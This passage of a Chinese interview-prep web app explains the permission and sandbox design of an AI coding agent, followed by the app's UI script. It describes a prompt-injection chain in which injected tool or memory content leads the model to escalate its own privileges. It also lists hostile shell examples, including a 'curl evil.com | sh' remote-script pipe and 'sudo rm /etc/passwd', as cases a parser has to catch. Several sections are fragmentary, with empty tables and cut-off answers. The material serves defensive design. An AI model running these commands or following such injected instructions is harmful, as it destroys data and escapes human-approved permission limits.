          <p>如果提供 <code>--yes</code>，等价于提供「一个可以无条件放行任何操作」的开关。在 CI 场景下，人们会习惯性加上它（「不然 CI 跑不了」），然后这个开关就长期存在于所有 CI 配置中。真正的安全边界（Workspace Boundary、Sandbox、Runtime <code>deny</code>）并不会因为 <code>--yes</code> 而放松，所以 <code>--yes</code> 只能放行「本来需要问的那一层」。它没有增加安全性，只是把问题从「配置怎么写对」变成「谁在 CI 配置里加了 <code>--yes</code>」。</p>
          <h4>fail-closed 的具体判定链</h4>
          <ol>
            <li>Workspace Trust 只决定 <code>read-only</code> 或 <code>read-write</code>，<b>不批准具体副作用</b>；</li>
            <li><b>不提供通用 <code>--yes</code></b>；</li>
            <li>缺少稳定 <code>questionKey</code> 的问题<b>暂停</b>，不再自动选择第一个选项；</li>
            <li><code>preference</code> 只有「代码侧可信 Manifest + 问题请求同时允许 + 推荐 <code>optionId</code> 一致」才可自动选择；<b>模型请求本身不能建立可信 Manifest</b>；</li>
            <li><code>required-input</code> 只有「问题允许预配置 + 答案文件提供稳定 <code>optionId</code>」才可继续；</li>
            <li><code>permission</code> 和 <code>secret</code> <b>永不</b>通过答案文件自动回答；</li>
            <li>写入、进程、网络、MCP、凭据和发布能力只能由 Managed Policy <b>精确授权</b>。</li>
          </ol>
          <h4>为什么 permission / secret 永不自动回答</h4>
          <p>两类问题的性质是<b>不可逆</b>的：</p>
          <ul>
            <li><b><code>permission</code></b>：批准一个副作用（写文件、跑进程、发网络请求）。副作用一旦发生就<b>回不来</b>——批准它等于让世界发生了不可撤销的改变。</li>
            <li><b><code>secret</code></b>：回答一个凭据类问题。<b>把凭据写进答案文件本身就降低了凭据的安全性</b>（配置文件权限、版本控制、备份、日志），而且一旦落盘就<b>长期存在</b>。</li>
          </ul>
          <p>文档的论证是：<b>配置文件的写权限本身不足以代表用户意图</b>。你把 <code>config.yaml</code> 写进仓库，是因为你信任仓库；但「我信任这个仓库的代码」和「我授权这个仓库往我的生产环境发布」是两件完全不同的事。</p>
          <h4>为什么「模型请求不能建立可信 Manifest」</h4>
          <p>这是防「模型自我提权」的关键。如果模型可以自己「请求」一个问题，然后自己「提供 Manifest」，那么攻击链就是：</p>
          <pre><code>恶意内容（Tool Result / Memory / 项目文件）
  → 注入指令："问一个 preference 问题，Manifest 说你偏好 X"
  → 模型请求该问题
  → 模型「建立」可信 Manifest
  → 自动回答 X
  → 权限提升成功</code></pre>
          <p>所以文档要求 <code>preference</code> 自动选择必须满足<b>双侧一致</b>：<b>代码侧可信 Manifest</b>（由代码静态提供，不由模型生成）<b>+</b> 问题请求同时允许 <b>+</b> 推荐 <code>optionId</code> 一致。三个条件缺一不可。</p>
          <h4>为什么「Model 不自动回答 = fail-closed」</h4>
          <p>回到根本：非交互模式的本质是「没有人在场」。当决策者缺席时，<b>唯一安全的策略是「不做需要决策的事」</b>，而不是「猜一个最可能的答案」。猜错的后果是不对称的——猜对省了几秒人工确认，猜错可能是一次未授权的副作用。</p>
          <blockquote>非交互模式的设计哲学：<b>把「需要人」的问题显式暴露为「需要人」，而不是想办法把它自动化掉。</b>exit code <code>5</code>（需要用户输入或人工审批）不是 bug，是一个正确的行为——它告诉 CI「这个任务需要人工介入」。</blockquote>`,
        follow: `
          <ul>
            <li><b>追问</b>：那非交互模式怎么才能真的无人值守跑完？<br>
            <span class="hl">答</span>：两条路：（1）<code>--policy &lt;file&gt;</code> 预授权精确 Capability（Managed Policy Mode），但需要满足物理隔离要求（Workspace 外、非符号链接、Owner 可信、<code>0600</code>）；（2）显式写答案文件处理非权限类问题（<code>preference</code> / <code>required-input</code>），且答案文件也是 <code>0600</code>。核心是：<b>无人值守必须通过「显式配置授权」实现，而不是通过「放宽 fail-closed」实现</b>。</li>
            <li><b>追问</b>：Managed Policy Mode 下，Profile 里的 <code>allow</code> 还有用吗？<br>
            <span class="hl">答</span>：Profile 的 <code>deny</code> 仍可收紧，但 <b><code>allow</code> 不能替代显式 Managed Policy Grant</b>。否则用户本地 profile 里写了一条 <code>allow</code>，CI 就会自动继承这个放行——但 CI 通常跑在没有用户 profile 的环境里，且非交互场景的授权必须来自组织策略而非本地个人配置。</li>
            <li><b>陷阱</b>：不要说「因为要方便 CI，所以提供 <code>--yes</code>」。正确答案是：<b>审批 UI 不是安全属性</b>；<code>--yes</code> 只能放行本来会问的那层，无法约束硬边界，却会在所有 CI 配置里长期存在。</li>
          </ul>`
      },
      {
        id: "q15",
        cat: "权限与执行边界",
        diff: 3,
        tags: ["ShellPolicy", "remote-shell-pipe", "降级", "审计"],
        src: ["packages/agents/code/src/permission/shell-parser.ts", "packages/agents/code/src/permission/shell-command-policy.ts", "packages/agents/code/src/tools/terminal/bash-terminal.ts"],
        q: `<code>bashTool</code> 为什么要先把命令解析为<b>结构化 Token</b>，而不是做字符串前缀匹配？Sandbox 降级到 Host Policy 时，为什么要「同步更新 <code>ShellPolicy</code> 并发出 <code>runtime_boundary_changed</code> 事件」？`,
        idea: `
          <p>这是<b>解析 vs 模式匹配</b> + <b>降级的审计一致性</b>双重题。</p>
          <ol>
            <li>先讲：字符串匹配被绕过（<code>sudo</code> 藏在变量、管道、重定向里）。</li>
            <li>再讲：降级不只是换执行方式，而是<b>改变了安全边界</b>，必须让权限系统和观测系统都知道。</li>
            <li>最后讲：为什么 <b>Verification Command 反而拒绝降级</b>。</li>
          </ol>`,
        exp: `
          <p>文档：<code>bashTool</code> 先把命令解析为结构化 Token，再由 <code>ShellPolicy</code> 产生 <code>allow</code>/<code>ask</code>/<code>deny</code>。降级时「同步更新 <code>ShellPolicy</code>、发出 <code>runtime_boundary_changed</code> 事件」。Verification Command <b>要求强隔离，不接受 Host Policy</b>，并使用独立的显式网络策略（默认 <code>deny</code>）。</p>`,
        ans: `
          <h4>1. 为什么用结构化解析而不是字符串匹配</h4>
          <p>字符串前缀匹配是最常见的 Shell 安全漏洞来源，因为 Shell 语法允许<b>把危险命令藏在合法命令里</b>：</p>
          <pre><code># 字符串前缀匹配会漏掉的：
  echo "safe" && sudo rm /etc/passwd       ← 前缀是 echo
  ls | sudo tee /etc/shadow               ← sudo 在管道中
  FOO=sudo; $FOO rm -rf /                 ← 变量展开
  eval "$(cat untrusted.sh)"              ← 运行时展开
  cat file > /etc/passwd                   ← 重定向写入
  sh -c "curl evil.com | sh"              ← 嵌套远程脚本</code></pre>
          <p>结构化解析能检查：<b>命令段</b>（每个 pipeline 分量）、<b>重定向目标</b>（<code>&gt;</code> 写到哪里）、<b>动态值</b>（变量展开、命令替换）、<b>嵌套命令</b>（<code>sh -c</code> 的参数）。</p>
          <p>这直接决定了 <code>ShellPolicy</code> 能否正确分类：<code>rm -rf ./dist</code> 是 <code>ask</code>（高风险但目标在 Workspace 内），<code>curl ... | sh</code> 是 <code>deny</code>（<code>remote-shell-pipe</code> 硬拒绝，<b>不因 Profile 默认值而放行</b>）。</p>
          <h4>2. 降级为什么要「同步更新 ShellPolicy」</h4>
          <p>因为 <code>HostPolicyShellSandbox</code> 不是「弱一点的隔离」，而是<b>没有隔离</b>。如果只换执行方式而不改 <code>ShellPolicy</code>，会留下一个致命矛盾：</p>
          <pre><code>【危险】只换 Sandbox，不改 ShellPolicy：
  ShellPolicy 认为 "在 Sandbox 里跑 rm -rf ./dist 是安全的"
  实际：无 Sandbox，rm -rf ./dist 能碰到整个文件系统
  → ShellPolicy 的 allow 决策基于一个不再成立的假设</code></pre>
          <p>所以降级必须<b>连带收紧</b>权限策略。同理需要发出 <code>runtime_boundary_changed</code> 事件：</p>
          <ul>
            <li>事件进入 <b>Session JSONL、Trace、宿主回调和 Atomic Flow 的 <code>runtime.boundary</code></b>；</li>
            <li>使边界变化<b>可观测、可审计</b>——事后能回答「这次执行到底有没有强隔离」；</li>
            <li>通知宿主 UI 显示当前运行状态变化。</li>
          </ul>
          <h4>3. 为什么 Verification Command 反而拒绝降级</h4>
          <p>这是一个<b>看起来不一致、实则一致</b>的设计，值得重点讲：</p>
          <ul>
            <li><b>普通 Bash</b>：用户交互式地跑命令，用户在场看到审批。降级到 Host Policy 是<b>可接受的权衡</b>（弱隔离 + 收紧权限 + 显式事件 = 至少边界是可知的）。</li>
            <li><b>Verification Command</b>：<b>执行项目自己的脚本</b>（<code>pnpm lint</code>、<code>pnpm test</code>、<code>pnpm build</code>），这些脚本可能包含来自仓库的不可信代码。它<b>不需要交互式审批</b>（Eval 自动触发），且<b>默认禁网</b>（独立的显式网络策略）。</li>
          </ul>
          <p>所以 Verification Command 的要求更严：<b>要求强隔离，不接受 Host Policy，缺少强隔离时直接失败</b>。而且 <code>isolated</code> 写策略在<b>临时工作区</b>运行，避免 lint/build/test 的生成文件污染主 Workspace。这体现了<b>「无人值守 + 不可信代码」场景下边界必须更硬</b>。</p>
          <h4>4. 降级的完整状态机</h4>
          <pre><code>BashTerminal 首次 Shell 启动成功
  → 发 runtime_boundary_changed: uninitialized → sandbox/container
    (正常情况)

平台隔离启动失败
  → 发 runtime_boundary_changed: sandbox/container → host-policy
  → 同步更新 ShellPolicy（收紧）
  → 后续执行在 Host Policy 下继续</code></pre>
          <blockquote>关键原则：<b>降级是显式的、有事件记录的、权限同步收紧的</b>。而 sandbox 包本身<b>不自动降级</b>（<code>SHELL_SANDBOX_UNAVAILABLE</code> 是稳定错误，由调用方决定是否降级）。「fail-closed 优于静默降级」是贯穿整个权限体系的态度。</blockquote>`,
        follow: `
          <ul>
            <li><b>追问</b>：如果 Sandbox 完全不可用（平台不支持），用户该怎么继续工作？<br>
            <span class="hl">答</span>：两条路：（1）Code Terminal 显式切换到 Host Policy，此时 <code>ShellPolicy</code> <b>同步收紧</b>，发出 <code>sandbox/container → host-policy</code> 事件，让用户知道边界变了；（2）不用 Shell，只用其他工具（如 <code>readTool</code>、<code>editTool</code>）。关键：<b>降级必须显式、必须事件化、必须权限同步</b>，而不是静默回落到无隔离 Host Shell。</li>
            <li><b>追问</b>：命令规则支持 <code>*</code> 通配，且命令匹配前会折叠空白。为什么折叠空白？<br>
            <span class="hl">答</span>：因为用户写规则时是用自然语言思考的（<code>rm  -rf   ./dist</code> 可能有多余空格）。折叠空白避免因格式差异导致规则「看起来匹配但实际不匹配」。这是「配置易用性」和「精确匹配」之间的务实折中——用规则的可预测性换取用户的低摩擦。</li>
            <li><b>陷阱</b>：不要说「Sandbox 不可用时自动降级到 Host Shell」。正确答案是：<b>返回稳定错误，由调用方显式选择降级，且降级必须同步收紧 ShellPolicy 并发出边界事件</b>；而 Verification Command 根本不接受降级。</li>
          </ul>`
      },{

        src: ["docs/atoms/atomic-flow.md", "docs/atoms/atom-catalog.md", "packages/atomic-flow/src/events.ts"],
        q: `Atomic Flow 为什么把 <code>AtomicDefinition</code>（key/kind/label/level）和 <code>AtomicInstance</code>（id/iteration/parentId）分开？Phase 状态机是怎么定义的？`,

          <p>Phase：<code>scheduled -&gt; start -&gt; delta* -&gt; end</code>，可 <code>error</code>，或 <code>scheduled -&gt; skipped</code>。Fold 映射：<code>scheduled→scheduled</code>、<code>start/delta→running</code>、<code>end→completed</code>、<code>error→failed</code>、<code>skipped→skipped</code>。注意「不要用最近一个同名 Atom 替代已知 Instance ID」。</p>`,
        ans: `
          <p>因为<b>「这是什么节点」和「这次执行是哪一次」是两个正交的问题</b>。</p>
          <h4>4 个定义字段的分工</h4>
          <table>
            <tr><th>字段</th><th>语义</th><th>稳定性</th></tr>
            <tr><td><code>key</code></td><td>稳定流程节点标识</td><td>跨 Run 完全一致</td></tr>
            <tr><td><code>kind</code></td><td>展示与语义分类</td><td>跨 Run 一致</td></tr>
            <tr><td><code>label</code></td><td>人类可读名称</td><td><b>不参与身份判断</b></td></tr>

          </table>

          <table>

            <tr><td><code>id</code></td><td>一次具体执行的身份</td><td>同一 <code>key</code> 可多次执行</td></tr>
            <tr><td><code>iteration</code></td><td>循环次数</td><td>重试 3 次的 Tool 调用是 3 个 Instance</td></tr>

          <h4>Parent 能表达、Edge 不能表达的</h4>
          <p><b>嵌套与所有权</b>。Tool Call 属于某次模型调用，Delegate 属于某个父 Agent，Attempt 属于某个 Eval Run。这些「谁包含谁」的关系必须是<b>严格树形</b>，否则 Trajectory 投影无法用「首个事件创建 Step，后续事件原位更新同一 Step」的单遍算法处理。</p>

          </ol>
          <h4><code>fromInstanceId</code> 的必要性</h4>
          <p>Edge 至少引用 Source/Target Atom <b>Key</b>，可选 <code>fromInstanceId</code> 精确关联<b>来源执行</b>。原因和 Instance 分层一样：<code>tool.call</code> 这个 Key 在一次 Run 里出现几十次，如果 Edge 只引用 Key，「某次 Eval 失败反馈给哪次模型调用」就无法确定。加上 <code>fromInstanceId</code> 后，Edge 才能指向<b>具体那一次</b>。</p>

          <h4>2. 为什么这很重要：三个用途</h4>
          <ol>
            <li><b>快照测试（Snapshot Testing）</b>：可以断言「跑完这 32 个 Check 后的 Scorecard 一定长这样」。如果投影不确定，快照测试就是<b>随机失败</b>，团队会很快放弃它。</li>
            <li><b>缓存</b>：可以缓存 Fold 结果或 Snapshot，只在事件前缀变化时重算。因为前缀确定，缓存命中必然等于重算结果。</li>

          </ol>
          <p>这也解释了为什么 <code>observeTrajectory()</code>（实时投影）选择<b>全量重算 + 不可共享状态的 Snapshot</b>，而不是增量维护。文档明确设计意图：<b>优先保证与静态投影一致</b>。代价是 O(n²) 的性能开销——但换来了「实时视图和离线 Replay 结果绝对一致」，这个交换是值得的。</p>
          <h4>3. Fold 拒绝的三类输入</h4>
          <table>
            <tr><th>拒绝</th><th>原因</th><th>为什么不「修复」</th></tr>

          </table>
          <p>核心哲学：<b>显式拒绝脏数据，而不是静默修复</b>。静默修复会污染 Fold 状态，而 Fold 状态是所有下游视图（Trajectory、Studio、Observatory）的基础——一旦污染，错误会向下扩散且无法溯源。</p>
          <h4>4. <code>projectTrajectory()</code> 的 8 步确定性算法</h4>

        q: `为什么自动压缩只发生在<b>可继续的 Stage 边界</b>，而不是在 Token 超过阈值时立即压缩？History 替换为什么是「一次性原子替换」？`,

        ans: `
          <h4>1. 为什么只能在 Stage 边界触发</h4>
          <p>因为<b>中途压缩会破坏消息配对</b>。Agent 的 History 中，工具调用是<b>成对</b>的：</p>
          <pre><code>正常 History 结构：
  user: "修复这个 bug"
  assistant: { tool_calls: [readTool(call-1)] }      ← 有请求

          <p>如果在 <code>readTool</code> 发出请求、结果还没回来时压缩，那条孤立 <code>tool_calls</code> 就被替换成了摘要。下一次模型调用收到的历史里<b>没有对应的 <code>tool_result</code></b>——很多 Provider 会直接报错拒绝（这是协议约束，不是偏好）。</p>

          <h4>2. 完整的 <code>maybeCompact()</code> 顺序</h4>
          <pre><code>Stage 结束（finishOutputStage 返回 action === "continue"）
  → emitStageFinished("continued")
  → await maybeCompact()
       → history = session.historySnapshot()
       → decision = budget.evaluate({
            contextWindow?, historyCharacters: Σ content.length, peakInputTokens?
         })
       → if (!shouldCompact) return                    ← 未达阈值，什么都不做
       → await session.compact("auto", decision.maxSummaryChars)
            → PreCompact Hook（allow/block + additionalContext）
            → Summarizer（无工具、单 Turn 的 Code Agent）
            → 校验：非空 + trim 后 ≤ maxChars
            → history.replace([{ role:"assistant", content: summary }])   ← 原子替换
            → PostCompact Hook（additionalContext 以 role:"user" 逐条追加）

          <h4>3. 为什么 History 替换是原子的</h4>
          <p>因为压缩过程<b>可能失败</b>。如果逐条替换历史，失败时会留下一个<b>半压缩状态</b>：前半段已经是摘要，后半段还是原始对话。这个状态既不是原始历史也不是摘要，而且<b>无法判断能否恢复</b>。</p>

          <pre><code>PreCompact 失败  →  History 不变        （可安全重试）
Summarizer 失败   →  History 不变        （可安全重试）
replace() 执行    →  ← 单向提交点
PostCompact 失败  →  History 已是摘要   （不回滚，只丢 additionalContext）
SessionStart/Reload 失败 → History 已是摘要（不回滚）</code></pre>
          <h4>5. 一个额外的顺序细节</h4>

          </ul>`
      },

          <h4>3. 为什么用「每 Token 4 字符」这个近似</h4>

          <p>关键设计：<code>charactersPerToken</code> 是 <code>ContextBudgetOptions</code> 的<b>可选可注入字段</b>，默认 4。这让它可以：</p>
          <ul>
            <li>在测试中注入确定值；</li>
            <li>未来针对特定模型调优；</li>
            <li>在 Provider 返回真实 usage 时被 Token 路径覆盖，不影响准确度。</li>
          </ul>
          <h4>4. 两个 Ratio 的配合关系</h4>
          <p>这是<b>滞回（hysteresis）</b>设计：</p>
          <pre><code>压缩前：┌─────────────────────────────────────┐ 100%
        │                                     │
  触发线 ├────────────── 70% ─────────────────┤  compactAtContextRatio = 0.7
        │              ↓ 压缩                 │
 目标线 ├────── 25% ──┤                       │  compactToContextRatio = 0.25
        │                                     │
        └─────────────────────────────────────┘ 0%

压缩前 70% → 压缩后 25%  →  距下次触发还有 45% 的增长空间</code></pre>
          <p>如果两者相等（都 0.7），压缩完立刻又到触发线，<b>会在每个 Stage 边界反复压缩</b>。这就是「振荡压缩（thrashing）」。<code>0.25 &lt; 0.7</code> 提供了 45% 的<b>安全余量</b>，让压缩后的 Stage 有足够空间工作。</p>
          <h4>5. 三个构造期的 fail-fast 校验</h4>
          <ul>
            <li><code>requireRatio()</code>：<code>compactAtContextRatio</code> 和 <code>compactToContextRatio</code> 都必须<b>严格位于 0 和 1 之间</b>，否则抛 <code>"... must be between 0 and 1."</code>。</li>
            <li>额外约束：<code>compactToContextRatio</code> 必须<b>小于</b> <code>compactAtContextRatio</code>。</li>
            <li><code>requirePositiveInteger()</code>：<code>fallbackMaxCharacters</code> 即使当前用不到也强制校验为正整数。</li>
          </ul>
          <h4>6. <code>Math.max(1, ...)</code> 下界保护</h4>
          <p>当 <code>contextWindow</code> 很小（比如 4）且 <code>compactToContextRatio</code> 很小时，<code>floor(4 × 0.25 × 4) = 4</code> 还行；但如果 <code>contextWindow</code> 配置成个位小数或 ratio 极小，可能算出 0。<b><code>maxSummaryChars = 0</code> 会让 Summarizer 无法产出任何东西，且长度校验 <code>summary.length &gt; 0 &gt; maxSummaryChars</code> 永远失败 → 每次压缩都失败 → Stage 反复重试。</b>下界 1 保证「至少能产出一个字符」，把失败变成「产出极短摘要」这个可降级的结果。</p>`,

          <h4>1. <code>peakInputTokens</code> 的语义</h4>
          <p>它是<b>本 Stage 累计的输入 Token 峰值</b>，不是 Session 全局峰值、不是累计总量、不是平均值。</p>
          <p>为什么用「峰值」而不是「当前值」：因为模型调用的输入 Token 会随着 History 增长而增长，且 Provider 返回的 usage 反映的是<b>那一次调用</b>的输入量。要判断「是否需要压缩」，要看<b>最坏情况</b>是否触线，而不是最新一次。峰值语义天然适合这个判定。</p>

          <pre><code>【不清零的路径】

          <p><b>为什么不直接加一个内置上限？</b>这是可辩论的设计取舍：</p>

          <h4>3. 为什么这类问题很常见</h4>
          <p>因为 <code>.env.example</code> → <code>.env</code> 的复制粘贴工作流是<b>生态标准做法</b>（这也是 <code>.env.example</code> 存在于仓库的原因）。结果是：<b>大量仓库都有带占位符的 <code>.env</code></b>。这些占位符在「项目优先」规则下会成为<b>有害的默认值</b>。</p>

          </table>

          <h4>6. <code>loadEnvFile()</code> 的额外约束</h4>

            <span class="hl">答</span>：这题在考<b>协作方式</b>。正确回答分两步：先<b>把分歧还原成前提差异</b>（"我们假设 X，但实际上 Y"——问清楚对方基于什么信息做了判断，通常会发现是<b>信息不对称</b>而不是价值观差异）；如果确实是价值观差异（他认为该成本可接受，我认为不可接受），那就<b>明确记录分歧并接受</b>，同时<b>把自己观察到的代价写成可验证的形式</b>（比如补一个测试证明这个边界会在某输入下破裂），让未来的决策有据可依。<b>不要反复争论，也不要悄悄绕过。</b></li>
            <li><b>追问</b>：你的反对意见如果<b>从来没被采纳过</b>，说明什么？<br>
            <span class="hl">答</span>：三种可能，都要能自己诊断：（1）你的方案<b>成本被低估了</b>——你说了"失去什么"吗？（2）你的方案<b>时机不对</b>——正确解但现在做不划算（检查是不是"缺一个触发条件"）；（3）<b>你和 maintainer 对问题的判断不一致</b>——那要去理解他看到了什么你没看到的东西。<b>长期"我提的都被拒"通常指向 (1) 或 (3)，很少是 (2)。</b></li>
            <li><b>陷阱</b>：不要列超过三条。列七条说明你在<b>罗列不认同</b>，而不是<b>有判断</b>。资深工程师通常能明确说出<b>一条</b>自己最有把握的。</li>
          </ul>`
      }
      ];
    </script>
    <script id="app-script">
      "use strict";
      const $ = (sel, root = document) => root.querySelector(sel);
      const el = (tag, props = {}, kids = []) => {
        const node = document.createElement(tag);
        for (const [k, v] of Object.entries(props)) {
          if (v === null || v === undefined) continue;
          if (k === "class") node.className = v;
          else if (k === "html") node.innerHTML = v;
          else if (k === "text") node.textContent = v;
          else if (k.startsWith("on") && typeof v === "function")
            node.addEventListener(k.slice(2), v);
          else node.setAttribute(k, v);
        }
        (Array.isArray(kids) ? kids : [kids]).forEach((c) => {
          if (c === null || c === undefined) return;
          node.appendChild(
            typeof c === "string" ? document.createTextNode(c) : c
          );
        });
        return node;
      };

      const store = {
        read() {
          try {
            return JSON.parse(localStorage.getItem(LS_KEY) || "[]");
          } catch {
            return [];
          }
        },
        write(v) {
          try {
            localStorage.setItem(LS_KEY, JSON.stringify(v));
          } catch {
            /* 隐私模式下静默失败 */
          }
        },
      };

      const state = {
        mode: "study",
        activeId: QUESTIONS[0].id,
        cats: new Set(),
        diffs: new Set(),
        search: "",
        done: new Set(store.read()),
        open: new Set(["exp", "idea"]),
        mock: null,
      };

      const MOCK = {
        cfg: { count: 8, cat: "全部", diff: "全部", ordered: false },
        run: null,
        load() {
          try {
            return JSON.parse(localStorage.getItem(LS_MOCK) || "null");
          } catch {
            return null;
          }
        },
        save() {
          try {
            localStorage.setItem(LS_MOCK, JSON.stringify(this.run));
          } catch {
            /* ignore */
          }
        },
        clear() {
          try {
            localStorage.removeItem(LS_MOCK);
          } catch {
            /* ignore */
          }
        },
      };

      /* 受当前侧栏筛选约束的题目池 */
      const pool = () =>
        QUESTIONS.filter(
          (q) =>
            (!state.cats.size || state.cats.has(q.cat)) &&
            (!state.diffs.size || state.diffs.has(q.diff)) &&
            (!MOCK.cfg.cat || MOCK.cfg.cat === "全部"
              ? true
              : q.cat === MOCK.cfg.cat) &&
            (!MOCK.cfg.diff || MOCK.cfg.diff === "全部"
              ? true
              : String(q.diff) === MOCK.cfg.diff)
        );

      const stripTags = (s) => s.replace(/<[^>]+>/g, "");

      /* 题型图例：区分「设计深挖题」与「综合面试题」的答案结构 */
      function legend() {
        return el("div", { class: "cat-note", html:
          "<b>两种题型，两种答案结构：</b>" +
          "<b>设计深挖题</b>（架构 / Runtime / 权限 / Atomic Flow / Memory / Compact / Subagents / Evals / Prompt / Skills / CLI / Research / 工程）" +
          "的答案是<b>确定的事实与推理</b>，可背、可核对。" +
          "<b>综合面试题</b>（最后一类）的答案分三段：<b>可从仓库推导</b>（有据）、" +
          '<span class="hl">需你补充</span>（虚线框，仓库里没有这些信息，必须你自己填——' +
          "决策动机、上线后的问题、真实误解点、是否验证过）、<b>评分标准</b>（什么样的回答算好）。" +
          "虚线框<b>故意留空</b>：编出来的标准答案是假的，面试时反而害你。" });
      }

      /* 来源指针：把题目锚定到权威文件，避免本文件成为 docs/ 与源码的分叉副本 */
      function srcLine(q) {
        if (!q.src?.length) return null;
        return el("div", { class: "src" }, [
          el("span", { class: "src-label", text: "来源" }),
          ...q.src.map((p) =>
            el("a", { href: `../${p}`, title: p }, [p])
          ),
        ]);
      }

      const visible = () => {
        const kw = state.search.trim().toLowerCase();
        if (!kw) return pool();
        const terms = kw.split(/\s+/);
        return pool().filter((q) => {
          const hay = [q.q, q.idea, q.ans, q.follow, q.cat, q.tags.join(" ")]
            .join(" ")
            .toLowerCase();
          return terms.every((t) => hay.includes(t));
        });
      };

      /* ---------------- sidebar ---------------- */
      function renderFilters() {
        const cf = $("#catFilter");
        cf.textContent = "";
        const counts = new Map();
        QUESTIONS.forEach((q) => {
          counts.set(q.cat, (counts.get(q.cat) || 0) + 1);
        });
        CATS.forEach((c) => {
          if (!counts.get(c)) return;
          cf.appendChild(
            el("button", {
              class: `chip${state.cats.has(c) ? " on" : ""}`,
              text: `${c} ${counts.get(c)}`,
              onclick: () => {
                state.cats.has(c) ? state.cats.delete(c) : state.cats.add(c);
                renderAll();
              },
            })
          );
        });

        const df = $("#diffFilter");
        df.textContent = "";
        [1, 2, 3].forEach((d) => {
          const n = QUESTIONS.filter((q) => q.diff === d).length;
          if (!n) return;
          df.appendChild(
            el("button", {
              class: `chip d${d}${state.diffs.has(d) ? ` on d${d}` : ""}`,
              text: `${DIFF_LABEL[d]} ${n}`,
              onclick: () => {
                state.diffs.has(d)
                  ? state.diffs.delete(d)
                  : state.diffs.add(d);
                renderAll();
              },
            })
          );
        });
      }

      function renderList() {
        const list = $("#qList");
        list.textContent = "";
        const items = visible();
        if (!items.length) {
          list.appendChild(
            el("li", { class: "list-empty", text: "没有匹配的题目" })
          );
          return;
        }
        items.forEach((q) => {
          const idx = QUESTIONS.indexOf(q) + 1;
          list.appendChild(
            el(
              "li",
              {
                class:
                  "q-item" +
                  (q.id === state.activeId ? " active" : "") +
                  (state.done.has(q.id) ? " done" : ""),
                onclick: () => {
                  state.activeId = q.id;
                  state.open = new Set(["exp", "idea"]);
                  renderAll();
                  $("#main").scrollTop = 0;
                },
              },
              [
                el("span", {
                  class: "n",
                  text: String(idx).padStart(2, "0"),
                }),
                el("span", { class: "t" }, [
                  document.createTextNode(stripTags(q.q)),
                  el("span", { class: "meta" }, [
                    el("span", { class: "mini", text: q.cat }),
                    el("span", {
                      class: "mini",
                      text: `· ${DIFF_LABEL[q.diff]}`,
                    }),
                  ]),
                ]),
                el("span", { class: "tick", text: "✓" }),
              ]
            )
          );
        });
      }

      function renderStats() {
        $("#statCount").innerHTML = `题目 <b>${visible().length}</b>`;
        $("#statDone").innerHTML =
          `掌握 <b>${state.done.size}</b> / ${QUESTIONS.length}`;
      }

      /* ---------------- study ---------------- */
      function section(kind, title, body) {
        const open = state.open.has(kind);
        const sec = el("section", {
          class: `sec ${kind}${open ? " open" : ""}`,
        });
        sec.appendChild(
          el(
            "button",
            {
              class: "sec-head",
              onclick: () => {
                state.open.has(kind)
                  ? state.open.delete(kind)
                  : state.open.add(kind);
                renderMain();
              },
            },
            [
              el("span", { class: "ico", text: "▶" }),
              el("span", { class: "ttl", text: title }),
              el("span", { class: "hint", text: open ? "收起" : "展开" }),
            ]
          )
        );
        sec.appendChild(
          el("div", { class: "sec-body prose", html: body })
        );
        return sec;
      }

      function renderStudy() {
        const q =
          QUESTIONS.find((x) => x.id === state.activeId) || QUESTIONS[0];
        const wrap = el("div", { class: "wrap" });

        wrap.appendChild(
          el("div", {
            class: "home-note",
            html:
              "<b>内容快照：2026-10-03。</b>本文件是 <code>docs/</code> 与 <code>packages/</code> 的<b>投影，不是事实源</b>；" +
              "权威内容以来源指针指向的文件为准。文中<b>架构不变量</b>（如 deny 短路、Parent/Edge 正交、只有 accepted 晋升记忆）可长期依赖；" +
              "<b>可调默认值</b>（阈值、权重、并发数、Grade 映射）会被后续改动，请点开对应来源确认当前值。",
            },
          )
        );
        wrap.appendChild(legend());
        wrap.appendChild(
          el("div", {
            class: "home-note",
            style: "margin-bottom:20px",
            html:
              "回答时请以「为什么这样设计」为主线，而不是背诵结论。" +
              '<br>快捷键：<span class="kbd">/</span> 搜索 · <span class="kbd">J</span>/<span class="kbd">K</span> 上下题 · <span class="kbd">A</span> 展开答案 · <span class="kbd">M</span> 标记掌握。',
          })
        );

        wrap.appendChild(
          el("div", { class: "q-head" }, [
            el("div", { class: "q-badges" }, [
              el("span", { class: "badge cat", text: q.cat }),
              el("span", {
                class: `badge d${q.diff}`,
                text: DIFF_LABEL[q.diff],
              }),
              ...q.tags.map((t) => el("span", { class: "badge tag", text: t })),
            ]),
            el("h2", { class: "q-title", html: q.q }),
            srcLine(q),
            el("div", { class: "q-actions" }, [
              el("button", {
                class: "action-btn primary",
                text: state.open.has("ans") ? "隐藏答案" : "查看答案",
                onclick: () => {
                  state.open.has("ans")
                    ? state.open.delete("ans")
                    : state.open.add("ans");
                  renderMain();
                },
              }),
              el("button", {
                class: "action-btn",
                text: state.open.has("follow") ? "收起追问" : "看追问",
                onclick: () => {
                  state.open.has("follow")
                    ? state.open.delete("follow")
                    : state.open.add("follow");
                  renderMain();
                },
              }),
              el("button", {
                class:
                  `action-btn${state.done.has(q.id) ? " marked" : ""}`,
                text: state.done.has(q.id) ? "✓ 已掌握" : "标记已掌握",
                onclick: () => {
                  state.done.has(q.id)
                    ? state.done.delete(q.id)
                    : state.done.add(q.id);
                  store.write([...state.done]);
                  renderAll();
                },
              }),
              el("button", {
                class: "action-btn",
                text: "展开全部",
                onclick: () => {
                  state.open = new Set(["idea", "ans", "follow"]);
                  renderMain();
                },
              }),
              el("button", {
                class: "action-btn",
                text: "全部收起",
                onclick: () => {
                  state.open = new Set();
                  renderMain();
                },
              }),
            ]),
          ])
        );

        if (q.exp) wrap.appendChild(section("exp", "事实速览", q.exp));
        wrap.appendChild(section("idea", "答题思路", q.idea));
        wrap.appendChild(section("ans", "完整答案", q.ans));
        wrap.appendChild(section("follow", "追问与陷阱", q.follow));

        const i = QUESTIONS.indexOf(q);
        wrap.appendChild(
          el("div", { class: "pager" }, [
            el("div", { class: "nav" }, [
              el("button", {
                class: "action-btn",
                text: "← 上一题",
                disabled: i <= 0,
                onclick: () => jump(i - 1),
              }),
              el("button", {
                class: "action-btn",
                text: "下一题 →",
                disabled: i >= QUESTIONS.length - 1,
                onclick: () => jump(i + 1),
              }),
            ]),
            el("span", {
              class: "mini",
              text: `第 ${i + 1} / ${QUESTIONS.length} 题 · 快捷键 J/K`,
            }),
          ])
        );

        return wrap;
      }

      function jump(i) {
        const next =
          QUESTIONS[Math.max(0, Math.min(QUESTIONS.length - 1, i))];
